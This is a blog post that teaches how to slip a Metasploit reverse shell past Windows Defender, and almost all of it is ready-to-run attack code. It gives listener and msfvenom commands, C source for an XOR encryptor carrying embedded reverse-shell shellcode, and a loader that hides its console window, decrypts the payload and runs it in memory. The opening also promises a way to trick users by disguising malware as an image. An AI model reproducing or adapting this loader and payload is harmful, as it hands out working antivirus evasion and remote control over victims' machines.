---
title: "Bypass Windows Defender With Xor Encryption"
date: 2024-04-22
---

# Prelude
---

If you're new in malware development, just like me you might've heard that it was possible to bypass windows defender with a simple encryption. 
I could not believe it, so I had to try it and why not put in a blog to describe my experience at the same time!
In this blog I will take you through it step by step. At the end, I will also introduce a clever way of fooling a user into clicking on our malware that will appear as an image.


# Environment Setup
---

If you want also want to perform this simple attack you will need to have to virtual machines
  - Windows Machine (victim)
  - Kali Linux or any other machine with metasploit on it (Attacker)


# Configuring your C2 (Command & Control)
---

Now, I know some of you will say what is a C2 or why am I considering metasploit as C2. Well, let me explain in this case metasploit will act as a command and control center because it will be used to issue commands to the compromised system and also, to receive data from them. Now that the air is cleared let's proceed!

- Start Metasploit Framework
  ```
  sudo service postgresql start && msfconsole -q
  ```
- Configure Listener
  ```
  use multi/handler
  set LHOST <HOST>
  set LPORT <PORT>
  run
  ```
- Generate shellcode
  ```
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<HOST> LPORT=<PORT> -f c -o <name>.c
  ```


# Coding
---

Now for all my fellow hackers who likes programming, I know your hands are itching right now, but you can finally used them or maybe not since I will provide you with the code already written,
but you can still play around with it if you want to!

- Coding the first application that will take the shellcode and will perform a xor encryption and will output the result
  
  > ⚠️ **Note:** You can edit the variable to put your own shellcode generated. The first program will be upgraded so you can pass the shellcode via a prompt, but for the sake of this demonstration, I didn't do it
  > Also note that if you edit the variable key, make sure that you have the same key in the second program.

  ```
  #include <Windows.h>
  #include <stdio.h>
  
  
  unsigned char shellcode[] =
  "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
  "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
  "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
  "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
  "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
  "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
  "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
  "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
  "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
  "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
  "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
  "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
  "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
  "\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
  "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
  "\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x0f\x81"
  "\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
  "\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
  "\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
  "\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
  "\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
  "\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
  "\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
  "\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
  "\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
  "\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
  "\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
  "\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
  "\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
  "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
  "\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
  "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
  
  unsigned char key[] = {
  	0x00, 0x01, 0x02, 0x03, 0x04, 0x05
  };
  
  VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) 
  {
  	for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
  		// if end of the key, start again 
  		if (j > sKeySize)
  		{
  			j = 0;
  		}
  		pShellcode[i] = pShellcode[i] ^ bKey[j];
  	}
  }
  
  VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) 
  {
  	printf("unsigned char %s[] = {", Name);
  
  	for (int i = 0; i < Size; i++) {
  		if (i % 16 == 0) {
  			printf("\n\t");
  		}
  		if (i < Size - 1) {
  			printf("0x%0.2X, ", Data[i]);
  		}
  		else {
  			printf("0x%0.2X ", Data[i]);
  		}
  	}
  
  	printf("};\n\n\n");
  }
  
  VOID logo() 
  {
  	printf("                                                                                                     \n");
  	printf("                                                                                                     \n");
  	printf("  ,----..                                 ___                                                        \n");
  	printf(" /   /   \\                  ,-.----.    ,--.'|_                                                      \n");
  	printf("|   :     :  __  ,-.        \\    /  \\   |  | :,'             __  ,-.                               \n");
  	printf(".   |  ;. /,' ,'/ /|        |   :    |  :  : ' :           ,' ,'/ /|                              \n");
  	printf(".   ; /--` '  | |' |   .--, |   | .\\ :.;__,'  /     ,---.  '  | |' |                              \n");
  	printf(";   | ;    |  |   ,' /_ ./| .   : |: ||  |   |     /     \\ |  |   ,'                              \n");
  	printf("|   : |    '  :  /, ' , ' : |   |  \\ ::__,'| :    /    /  |'  :  /                                \n");
  	printf(".   | '___ |  | '/___/ \\: | |   : .  |  '  : |__ .    ' / ||  | '                                 \n");
  	printf("'   ; : .'|;  : | .  \\  ' | :     |`-'  |  | '.'|'   ;   /|;  : |                                 \n");
  	printf("'   | '/  :|  , ;  \\  ;   : :   : :     ;  :    ;'   |  / ||  , ;                                 \n");
  	printf("|   :    /  ---'    \\  \\  ; |   | :     |  ,   / |   :    | ---'                                  \n");
  	printf(" \\   \\ .'            :  \\  \\`---'.|      ---`-'   \\   \\  /                                           \n");
  	printf("  `---`               \\  ' ;  `---`                `----'                                            \n");
  	printf("                       `--`                                                                          \n");
  }
  
  int main() 
  {
  	logo();
  
  	printf("[i] shellcode : 0x%p \n", shellcode);
  	XorByInputKey(shellcode, sizeof(shellcode), key, sizeof(key));
  	PrintHexData("Encrypted_Shellcode", shellcode, sizeof(shellcode));
  
  	printf("[#] Press <Enter> To Quit ...");
  	getchar();
  
  	return 0;
  }
  ```
- Coding the second application, that will use the encrypted payload, decrypt it and perform a simple local process injection
   > ⚠️ **Note:** You can edit the variable to put your own encrypted shellcode generated. Also make sure that the value inside the variable key is the same as when you generated the encrypted payload

  ```
  #include <Windows.h>
  #include <stdio.h>
  
  
  VOID logo() 
  {
  	printf("   *                      (                                                     \n");
  	printf(" (  `             )       )\\ )    )       (   (    (                         )   \n");
  	printf(")\\))(     (   ( /(    ) (()/\\ ( /(    (  )\\  )\\   )\\   (    (            ( /(   \n");
  	printf("((_)()\\   ))\\  )\\())( /(  /(_)|(_)   ))\\((_)((_)(((_)  )(   )\\ )  `  )   )\\())  \n");
  	printf("(_()((_) /((_)(_))/ )(_))(_))_| |    /((_)_   _  )\\___ (()\\ (()/(  /(/(  (_))/   \n");
  	printf("|  \\/  |(_))  | |_ ((_)_ / __|| |   (_)) | | | |((/ __| ((_))(_))((_)_\\ | |_    \n");
  	printf("| |\\/| |/ -_) |  _|/ _` |\\__ \\| ' \\ / -_)| | | | | (__ | '_|| || || '_ \\)|  _|   \n");
  	printf("|_|  |_|\\___|  \\__|\\__,_||___/|_||_|\\___||_| |_|  \\___||_|   \\_, || .__/ \\__|   \n");
  	printf("                                                             |__/ |_|            \n");
  }
  
  unsigned char key[] = {
  	0x00, 0x01, 0x02, 0x03, 0x04, 0x05
  };
  
  unsigned char encShellcode[] = {
  		0xFC, 0x49, 0x81, 0xE7, 0xF4, 0xED, 0xC0, 0x00, 0x01, 0x02, 0x42, 0x55, 0x44, 0x50, 0x52, 0x50,
  		0x54, 0x4B, 0x35, 0xD7, 0x65, 0x48, 0x8A, 0x50, 0x63, 0x4C, 0x8E, 0x52, 0x18, 0x49, 0x89, 0x51,
  		0x24, 0x4D, 0x8B, 0x72, 0x51, 0x4A, 0x0C, 0xB3, 0x4F, 0x4A, 0x4D, 0x30, 0xCB, 0x4B, 0x35, 0xC5,
  		0xAC, 0x3C, 0x60, 0x7E, 0x01, 0x28, 0x25, 0x41, 0xC1, 0xC8, 0x0F, 0x42, 0x05, 0xC4, 0xE2, 0xED,
  		0x53, 0x43, 0x52, 0x4C, 0x8E, 0x52, 0x20, 0x8A, 0x40, 0x3F, 0x4C, 0x04, 0xD0, 0x8B, 0x81, 0x8A,
  		0x03, 0x04, 0x05, 0x48, 0x85, 0xC1, 0x76, 0x64, 0x4C, 0x04, 0xD0, 0x50, 0x8A, 0x4A, 0x1B, 0x40,
  		0x8E, 0x40, 0x20, 0x48, 0x03, 0xD3, 0xE7, 0x53, 0x48, 0xFF, 0xC8, 0x43, 0x88, 0x30, 0x8D, 0x48,
  		0x01, 0xD7, 0x4F, 0x32, 0xCD, 0x4D, 0x31, 0xC0, 0xAD, 0x43, 0xC2, 0xCD, 0x08, 0x41, 0x01, 0xC0,
  		0x3A, 0xE3, 0x71, 0xF4, 0x4C, 0x03, 0x4D, 0x26, 0x0B, 0x41, 0x3C, 0xD1, 0x75, 0xD9, 0x5A, 0x47,
  		0x8F, 0x45, 0x24, 0x49, 0x00, 0xD2, 0x65, 0x45, 0x8E, 0x0C, 0x48, 0x45, 0x89, 0x43, 0x18, 0x4C,
  		0x01, 0xD0, 0x40, 0x89, 0x07, 0x8C, 0x4D, 0x01, 0xD0, 0x40, 0x5A, 0x42, 0x5C, 0x5B, 0x59, 0x5A,
  		0x40, 0x5A, 0x42, 0x5D, 0x44, 0x5A, 0x48, 0x82, 0xEE, 0x23, 0x45, 0x57, 0xFF, 0xE0, 0x59, 0x43,
  		0x5A, 0x5E, 0x4D, 0x8B, 0x12, 0xE8, 0x55, 0xFC, 0xFB, 0xFA, 0x5D, 0x49, 0xBF, 0x75, 0x70, 0x36,
  		0x5A, 0x33, 0x32, 0x01, 0x02, 0x42, 0x52, 0x4C, 0x89, 0xE6, 0x49, 0x83, 0xEF, 0xA4, 0x04, 0x00,
  		0x00, 0x48, 0x8B, 0xE6, 0x4D, 0xB9, 0x02, 0x00, 0x10, 0x5E, 0xC3, 0xAC, 0x0A, 0x81, 0x41, 0x55,
  		0x4B, 0x8A, 0xE0, 0x49, 0x89, 0xF1, 0x40, 0xB8, 0x4F, 0x73, 0x23, 0x07, 0xFF, 0xD4, 0x4E, 0x8A,
  		0xEE, 0x6D, 0x01, 0x01, 0x01, 0x02, 0x5A, 0x45, 0xBF, 0x29, 0x80, 0x6A, 0x02, 0xFC, 0xD1, 0x55,
  		0x50, 0x4D, 0x30, 0xCB, 0x4E, 0x35, 0xC5, 0x48, 0xFF, 0xC1, 0x4A, 0x8A, 0xC6, 0x4D, 0xFF, 0xC0,
  		0x49, 0x8B, 0xC2, 0x45, 0xBF, 0xEA, 0x0F, 0xDE, 0xE2, 0xFC, 0xD1, 0x4D, 0x89, 0xC7, 0x6B, 0x12,
  		0x42, 0x5C, 0x49, 0x89, 0xE2, 0x49, 0x8B, 0xFA, 0x45, 0xBF, 0x99, 0xA5, 0x75, 0x63, 0xFC, 0xD1,
  		0x4D, 0x81, 0xC4, 0x41, 0x00, 0x03, 0x04, 0x4C, 0xB8, 0x63, 0x6C, 0x66, 0x03, 0x04, 0x05, 0x00,
  		0x00, 0x40, 0x52, 0x42, 0x54, 0x4D, 0x89, 0xE2, 0x56, 0x55, 0x54, 0x49, 0x34, 0xC0, 0x6A, 0x0C,
  		0x5B, 0x42, 0x54, 0xE7, 0xFC, 0x66, 0xC6, 0x46, 0x27, 0x50, 0x04, 0x01, 0x48, 0x8C, 0x46, 0x27,
  		0x1C, 0xC3, 0x00, 0x68, 0x49, 0x8B, 0xE5, 0x52, 0x55, 0x41, 0x50, 0x40, 0x52, 0x42, 0x54, 0x4C,
  		0xFF, 0xC0, 0x40, 0x52, 0x4A, 0xFB, 0xCD, 0x4D, 0x89, 0xC0, 0x4E, 0x8A, 0xC5, 0x44, 0xBA, 0x79,
  		0xCD, 0x3D, 0x85, 0xFB, 0xD0, 0x48, 0x31, 0xD3, 0x4A, 0xFC, 0xCE, 0x8E, 0x0E, 0x41, 0xBB, 0x0A,
  		0x84, 0x19, 0x65, 0xFF, 0xD5, 0xBA, 0xF2, 0xB6, 0xA6, 0x53, 0x41, 0xBA, 0xA7, 0x97, 0xBE, 0x99,
  		0xFA, 0xD5, 0x48, 0x82, 0xC6, 0x2B, 0x38, 0x03, 0x7C, 0x0A, 0x81, 0xF9, 0xE3, 0x71, 0x00, 0xBB,
  		0x47, 0x12, 0x70, 0x6C, 0x6E, 0x05, 0x59, 0x41, 0x88, 0xD8, 0xFC, 0xD1, 0x05 };
  
  VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize)
  {
  	for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
  		// if end of the key, start again 
  		if (j > sKeySize)
  		{
  			j = 0;
  		}
  		pShellcode[i] = pShellcode[i] ^ bKey[j];
  	}
  }
  
  VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size)
  {
  	printf("unsigned char %s[] = {", Name);
  
  	for (int i = 0; i < Size; i++) {
  		if (i % 16 == 0) {
  			printf("\n\t");
  		}
  		if (i < Size - 1) {
  			printf("0x%0.2X, ", Data[i]);
  		}
  		else {
  			printf("0x%0.2X ", Data[i]);
  		}
  	}
  
  	printf("};\n\n\n");
  }
  
  
  int main() 
  {
  	ShowWindow(GetConsoleWindow(), SW_HIDE);
  	
  	logo();
  
  	PrintHexData("Encrypted_Shellcode", encShellcode, sizeof(encShellcode));
  	XorByInputKey(encShellcode, sizeof(encShellcode), key,sizeof(key));
  	PrintHexData("Decrypted_Shellcode", encShellcode, sizeof(encShellcode));
  
  	HANDLE processHandle = GetCurrentProcess();
  	PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof encShellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
  	WriteProcessMemory(processHandle, remoteBuffer, encShellcode, sizeof encShellcode, NULL);
  	
  	HANDLE remoteThread = CreateRemoteThreadEx(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL, NULL);
  
  	CloseHandle(processHandle);
  
  	printf("[#] Press <Enter> To Quit ...");
  	getchar();
  
      return 0;
  }
  ```

  # Proof
  ---

  ![Proof Image](/../assets/images/proof.png)




